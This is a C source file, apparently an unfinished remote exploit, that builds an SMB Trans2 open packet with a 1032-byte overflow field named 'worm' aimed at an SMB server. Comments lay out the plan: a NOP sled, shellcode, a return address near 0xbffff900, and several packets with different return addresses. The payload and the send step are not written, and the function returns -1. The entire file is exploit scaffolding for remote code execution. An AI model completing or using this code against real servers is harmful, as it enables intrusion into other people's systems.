#include "../../lib/nbios/nbios.h"
#include "../../lib/smb/smb.h"

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <arpa/inet.h>
#include <sys/socket.h>

#pragma pack(push, p1, 1)

struct payload_t {
  uint8_t name;
  uint16_t flags;
  uint16_t access_mode;
  uint16_t search_attributes;
  uint16_t file_attributes;
  uint32_t creation_time;
  uint16_t open_function;
  uint32_t allocation_size;
  uint8_t worm[1032];
};

struct packet_t {
  struct nbios_header nb_hdr;
  struct smb_header smb_hdr;
  uint8_t word_count;
  struct smb_trans2 parameters;
  uint16_t byte_count;
  struct payload_t data;
};

#pragma pack(pop, p1)

int smb_trans2open(int sock, uint16_t uid, uint16_t tid) {
  struct packet_t packet;
  memset(&packet, 0, sizeof(struct packet_t));

  // Net Bios
  packet.nb_hdr.length = htons(sizeof(struct packet_t) - 4);

  // Smb Header
  memcpy(packet.smb_hdr.protocol, SMB_PROTO, 4);
  packet.smb_hdr.command = SMB_TRANS2;
  packet.smb_hdr.flag = 0x18;
  packet.smb_hdr.flag2 = htole16(0x1002);
  packet.smb_hdr.uid = uid;
  packet.smb_hdr.tid = tid;

  // Word Count
  packet.word_count = sizeof(struct smb_trans2) / 2;

  // Parameters
  packet.parameters.total_parameter_count = htole16(18);
  packet.parameters.total_data_count = htole16(1032);

  packet.parameters.parameter_count = 18;
  packet.parameters.parameter_offset =
      (uint8_t *)&packet.data.flags - (uint8_t *)&packet.smb_hdr.protocol;

  packet.parameters.data_count = htole16(1032);
  packet.parameters.data_offset =
      (uint8_t *)&packet.data.worm - (uint8_t *)&packet.smb_hdr.protocol;

  packet.parameters.setup_count = 1;
  packet.parameters.setup_words = htole16(0x0001);

  packet.data.access_mode = htole16(0x0042);   // full accessk
  packet.data.open_function = htole16(0x0011); // Open or create

  // FIXME: Make a payload. Payload is a 500 bytes of nop-sled, at end - return
  // address near by 0xbffff900. Other - shellcode and trash

  // BUG: No sending and receiving.

  // WARN: You need to send more than 1 packet with differens return addresses.

  return -1;
};
